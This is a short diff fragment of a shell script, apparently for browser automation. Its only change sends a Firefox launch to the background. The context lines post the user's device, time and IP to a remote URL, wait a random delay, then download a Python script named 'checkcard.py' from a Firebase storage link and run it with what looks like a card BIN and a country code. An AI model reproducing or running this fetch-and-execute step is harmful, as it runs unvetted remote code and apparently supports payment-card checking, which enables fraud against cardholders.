@@ -17,7 +17,7 @@ echo $link
 curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"key\":\" \",\"link\":\"$link\",\"device\":\"$user\",\"times\":\"$timevn\",\"ip\":\"$ip\"}" $url
 wait=$(shuf -i 60-500 -n 1)
 sleep $wait
-firefox $link
+firefox $link &
 wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=08b755b6-572b-43bf-9d2d-6a7db60bee2b
 python3 check.py 421542 us
 #python3 /headless/Desktop/backup/pygui.py
